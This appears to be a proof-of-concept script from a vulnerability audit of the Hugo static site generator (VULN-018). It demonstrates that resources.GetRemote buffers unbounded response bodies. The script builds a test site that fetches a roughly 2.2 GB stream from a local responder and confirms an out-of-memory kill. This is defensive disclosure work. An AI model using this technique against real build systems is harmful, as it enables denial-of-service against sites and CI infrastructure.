#!/usr/bin/env python3
"""
VULN-018 — GetRemote reads the entire response body with io.ReadAll (no size cap) -> build DoS
==============================================================================================

VULN-ID     : VULN-018
Title       : resources.GetRemote buffers the whole body via io.ReadAll, unbounded
Vuln file   : targets/hugo/resources/resource_factories/create/remote.go:296 (io.ReadAll of res.Body)
CWE         : CWE-770 (allocation without limits) — the REMOTE server sizes the allocation

The flaw
--------
After the URL/method allowlist passes, GetRemote does:

    body, err = io.ReadAll(res.Body)   // whole body into RAM, no io.LimitReader/MaxBytesReader

httpClient.Timeout bounds TIME, not BYTES. The default security.http.urls permits any
public host, so the responding server need not be trusted — a streaming / Content-Length
lying responder dictates how much memory the build allocates.

Exploitation idea
-----------------
A malicious endpoint streams ~2 GB. GetRemote buffers it into RAM; a 1 GB-capped build
is OOM-killed. A small body builds fine — same code path, the responder chooses the size.

What a successful run proves
---------------------------
The build's memory is controlled by the remote server's body length, not by any Hugo
limit: a large streamed body OOM-kills the build while a small one succeeds.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C

VULN = "VULN-018"
MEM = os.environ.get("MEM_CAP", "1g")
HUGE = int(os.environ.get("BODY_BYTES", str(2_200_000_000)))   # ~2.2 GB > 1 GB cap


def run_case(body_bytes: int, mem: str, timeout: int):
    with C.OOBListener(body_bytes=body_bytes) as srv:
        url = f"http://bombhost.local:{srv.port}/stream"
        layout = (
            '{{- $r := try (resources.GetRemote "%s") -}}\n'
            '{{- with $r.Err }}ERR:{{ . }}{{ else }}{{ with $r.Value }}LEN={{ len .Content }}{{ end }}{{ end -}}\n'
            % url
        )
        files = {
            "hugo.toml": "baseURL='http://localhost/'\ntitle='h18'\n"
                         "disableKinds=['taxonomy','term','sitemap','rss','404']\n"
                         "[security.http]\n  urls = ['(?i)^https?://']\n",  # reach the loopback responder
            "content/_index.md": "---\ntitle: home\n---\n",
            "layouts/index.html": layout,
        }
        site = C.make_site(__file__, files, name=f"buildsite_{body_bytes}")
        rc, out, public = C.run_hugo(
            site, render_to_memory=False, network="host", memory=mem, timeout=timeout,
            extra_docker=["--add-host=bombhost.local:127.0.0.1"])
        html = ""
        if public and os.path.isfile(os.path.join(public, "index.html")):
            html = open(os.path.join(public, "index.html"), encoding="utf-8").read()
        return rc, out, html.strip(), len(srv.records)


def main() -> int:
    C.banner(VULN, "GetRemote unbounded io.ReadAll of the response body -> build OOM",
             info="exercising create/remote.go io.ReadAll(res.Body) (no io.LimitReader anywhere in the chain)",
             target="throwaway `hugo` build -> malicious responder capped at %s RAM" % MEM)

    # ---- Control: a small body proves the fetch path is valid -------------------
    C.log("SETUP", "control build: responder returns a small (64 KB) body")
    rc0, out0, html0, hits0 = run_case(65536, "2g", 60)
    C.log("INFO", f"control: rc={rc0} output={html0!r} responder-hits={hits0}")
    if rc0 != 0:
        C.log("FAIL", f"control build failed (rc={rc0}); cannot attribute the DoS:\n{out0[-600:]}")
        print(f"==> {VULN}: FAILED — control broken")
        return 1

    # ---- Attack: the responder streams ~2.2 GB -> io.ReadAll OOMs the 1 GB build -
    C.log("STEP", f"attack build: responder streams ~{HUGE//10**9} GB under --memory={MEM}")
    rc1, out1, html1, hits1 = run_case(HUGE, MEM, 120)
    with open(os.path.join(os.path.dirname(__file__), "response.txt"), "w") as fh:
        fh.write(f"[control 64KB] rc={rc0} out={html0} hits={hits0}\n\n"
                 f"[attack ~{HUGE} bytes] rc={rc1} hits={hits1}\n{out1[-1500:]}")
    oom = rc1 == 137 or rc1 == 124 or ("out of memory" in out1.lower()) or ("signal: killed" in out1.lower())
    C.log("PROOF", f"attack: responder-hits={hits1} rc={rc1} (137=OOM-kill, 124=timeout)")

    if oom and hits1 >= 1:
        C.log("OK", "exploit confirmed — the remote server's oversized streamed body was buffered by "
                    "io.ReadAll with no ceiling and OOM-killed the build, while a small body built fine. "
                    "The build's memory is dictated by the (untrusted) responder = unbounded-body DoS.")
        print(f"==> {VULN}: CONFIRMED — GetRemote unbounded response body OOM-kills the build")
        return 0
    C.log("FAIL", f"attack did not OOM (rc={rc1}, hits={hits1}); a body limit may exist:\n{out1[-600:]}")
    print(f"==> {VULN}: FAILED — no OOM observed")
    return 1


if __name__ == "__main__":
    sys.exit(main())
